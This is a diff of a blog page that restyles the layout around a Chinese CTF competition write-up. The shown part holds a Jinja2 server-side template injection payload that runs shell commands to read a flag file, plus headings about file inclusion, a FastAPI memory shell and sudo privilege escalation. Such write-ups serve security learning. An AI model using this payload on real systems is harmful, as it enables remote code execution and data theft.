@@ -1,183 +1,183 @@
 <!DOCTYPE html>
-<html lang=en>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="锦家有什么查看源码发现&#x2F;try_a_try  直接猜参数是name果真！果然也是ssti直接秒了 12try_a_try?name&#x3D;&#123;&#123;lipsum.__globals__.os.popen(&#x27;tac &#x2F;f*&#x27;).read()&#125;&#125;NSSCTF&#123;191c23bd-63f0-4383-8719-15471a3e78e8&amp;#">
-<meta property="og:type" content="article">
-<meta property="og:title" content="成都大学第八届玄武杯（ak）">
-<meta property="og:url" content="https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/index.html">
-<meta property="og:site_name" content="Rufeii">
-<meta property="og:description" content="锦家有什么查看源码发现&#x2F;try_a_try  直接猜参数是name果真！果然也是ssti直接秒了 12try_a_try?name&#x3D;&#123;&#123;lipsum.__globals__.os.popen(&#x27;tac &#x2F;f*&#x27;).read()&#125;&#125;NSSCTF&#123;191c23bd-63f0-4383-8719-15471a3e78e8&amp;#">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/1.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/2.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/3.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/4.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/5.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/6.png">
-<meta property="article:published_time" content="2025-11-02T04:19:59.000Z">
-<meta property="article:modified_time" content="2025-11-02T14:58:09.164Z">
-<meta property="article:author" content="Rufeii">
-<meta property="article:tag" content="ssti">
-<meta property="article:tag" content="文件包含">
-<meta property="article:tag" content="fastapi内存马">
-<meta property="article:tag" content="sudo提权">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2025/11/1.png">
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Rufeii" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
     
-    
-      
-        
-          <link rel="shortcut icon" href="/images/website.jpg">
-        
+      成都大学第八届玄武杯（ak） 
       
       
-        
-          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
-        
-      
+      |
     
-    <!-- title -->
-    <title>成都大学第八届玄武杯（ak）</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+     Rufeii
+  </title>
 
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">h0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">ab0ut</a></li><!--
-     --><!--
-       --><li><a href="/categories/">categ0ries</a></li><!--
-     --><!--
-       --><li><a href="/links/">links</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2025/11/03/FastAPI%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&text=成都大学第八届玄武杯（ak）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&is_video=false&description=成都大学第八届玄武杯（ak）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=成都大学第八届玄武杯（ak）&body=Check out this article: https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&name=成都大学第八届玄武杯（ak）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&t=成都大学第八届玄武杯（ak）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%A6%E5%AE%B6%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">锦家有什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-include"><span class="toc-number">2.</span> <span class="toc-text">ez_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#normal-php"><span class="toc-number">3.</span> <span class="toc-text">normal_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%BC%E8%A7%81%E4%B8%8D%E4%B8%80%E5%AE%9A%E4%B8%BA%E5%AE%9E"><span class="toc-number">4.</span> <span class="toc-text">眼见不一定为实</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-file"><span class="toc-number">5.</span> <span class="toc-text">ez_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-include-revenge"><span class="toc-number">6.</span> <span class="toc-text">ez_include_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">6.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-number">6.2.</span> <span class="toc-text">预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-fastapi"><span class="toc-number">7.</span> <span class="toc-text">ez_fastapi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-1"><span class="toc-number">7.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F-1"><span class="toc-number">7.2.</span> <span class="toc-text">预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        成都大学第八届玄武杯（ak）
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">Rufeii</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2025-11-02T04:19:59.000Z" class="dt-published" itemprop="datePublished">2025-11-02</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98/">赛题</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/fastapi%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">fastapi内存马</a>, <a class="p-category" href="/tags/ssti/" rel="tag">ssti</a>, <a class="p-category" href="/tags/sudo%E6%8F%90%E6%9D%83/" rel="tag">sudo提权</a>, <a class="p-category" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a>
-    </div>
-
-
-    </div>
-  </header>
+  
+    <link rel="apple-touch-icon" href="/images/me.jpg">
+    <link rel="icon" href="/images/me.jpg">
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="锦家有什么"><a href="#锦家有什么" class="headerlink" title="锦家有什么"></a>锦家有什么</h2><p>查看源码发现&#x2F;try_a_try</p>
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Rufeii</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/search/">
+          <a href="/search/">Search</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">成都大学第八届玄武杯（ak）</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-11-02 22:58:09
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E8%B5%9B%E9%A2%98/" title="赛题">
+                    <b>#</b> 赛题
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="锦家有什么"><a href="#锦家有什么" class="headerlink" title="锦家有什么"></a>锦家有什么</h2><p>查看源码发现&#x2F;try_a_try</p>
 <p><img src="/images/achieve/2025/11/1.png"></p>
 <p>直接猜参数是name果真！果然也是ssti直接秒了</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try<span class="built_in">_</span>a<span class="built_in">_</span>try?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;tac /f*&#x27;).read()&#125;&#125;</span><br><span class="line">NSSCTF&#123;191c23bd-63f0-4383-8719-15471a3e78e8&#125;</span><br></pre></td></tr></table></figure>
@@ -293,150 +293,159 @@
 <p>这样就打通了</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题还是很不错的，增加了我对ssti，反弹shell，linux提权，内存马的理解！</p>
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">h0me</a></li>
-        
-          <li><a href="/about/">ab0ut</a></li>
-        
-          <li><a href="/categories/">categ0ries</a></li>
-        
-          <li><a href="/links/">links</a></li>
-        
-          <li><a href="/search/">Search</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%A6%E5%AE%B6%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">锦家有什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-include"><span class="toc-number">2.</span> <span class="toc-text">ez_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#normal-php"><span class="toc-number">3.</span> <span class="toc-text">normal_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%BC%E8%A7%81%E4%B8%8D%E4%B8%80%E5%AE%9A%E4%B8%BA%E5%AE%9E"><span class="toc-number">4.</span> <span class="toc-text">眼见不一定为实</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-file"><span class="toc-number">5.</span> <span class="toc-text">ez_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-include-revenge"><span class="toc-number">6.</span> <span class="toc-text">ez_include_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">6.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-number">6.2.</span> <span class="toc-text">预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-fastapi"><span class="toc-number">7.</span> <span class="toc-text">ez_fastapi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-1"><span class="toc-number">7.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F-1"><span class="toc-number">7.2.</span> <span class="toc-text">预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
       </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-11-02 22:58:09
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E8%B5%9B%E9%A2%98/" title="赛题">
+                        <b>#</b> 赛题
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/11/28/2024%E8%9C%80%E9%81%93%E5%B1%B1/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&text=成都大学第八届玄武杯（ak）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&is_video=false&description=成都大学第八届玄武杯（ak）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=成都大学第八届玄武杯（ak）&body=Check out this article: https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&title=成都大学第八届玄武杯（ak）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&name=成都大学第八届玄武杯（ak）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/&t=成都大学第八届玄武杯（ak）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
   </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%A6%E5%AE%B6%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-text">锦家有什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-include"><span class="toc-text">ez_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#normal-php"><span class="toc-text">normal_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%BC%E8%A7%81%E4%B8%8D%E4%B8%80%E5%AE%9A%E4%B8%BA%E5%AE%9E"><span class="toc-text">眼见不一定为实</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-file"><span class="toc-text">ez_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-include-revenge"><span class="toc-text">ez_include_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-text">预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-fastapi"><span class="toc-text">ez_fastapi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-1"><span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F-1"><span class="toc-text">预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/rufeii/rufeii.github.io">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="/">Copyright © 2026 Rufeii</a>
+        
+    </div>
+  
+    
